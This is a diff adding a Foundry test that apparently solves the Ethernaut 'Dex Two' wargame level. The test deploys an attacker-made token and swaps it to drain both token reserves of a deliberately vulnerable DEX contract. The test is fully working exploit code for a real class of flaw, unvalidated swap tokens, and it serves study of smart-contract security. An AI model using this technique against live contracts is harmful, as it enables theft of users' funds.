@@ -32,5 +32,44 @@ contract DexTwoTest is Test {
       
     }
 
+
+    function testExploit() public {
+    vm.startPrank(attacker);
+
+    // Deploy attacker-controlled token
+    SwappableTokenTwo maliciousToken = new SwappableTokenTwo(
+        address(dexTwo),
+        "DrainToken",
+        "DTK",
+        1000  // Attacker gets 1000 tokens
+    );
+
+    // Approve DexTwo to spend attacker's malicious tokens
+    maliciousToken.approve(address(dexTwo), type(uint256).max);
+
+    // Seed Dex with 1 malicious token (to avoid division by zero)
+    maliciousToken.transfer(address(dexTwo), 1);
+
+    // Drain Token A reserve (100 A)
+    dexTwo.swap(address(maliciousToken), address(swappabletokenA), 1);
+    
+    // Drain Token B reserve (100 B)
+    dexTwo.swap(address(maliciousToken), address(swappabletokenB), 2);
+
+    vm.stopPrank();
+
+    // Verify both reserves are emptied
+    assertEq(
+        swappabletokenA.balanceOf(address(dexTwo)), 
+        0, 
+        "Token A reserves not drained"
+    );
+    assertEq(
+        swappabletokenB.balanceOf(address(dexTwo)), 
+        0, 
+        "Token B reserves not drained"
+    );
+}
+
   
 }
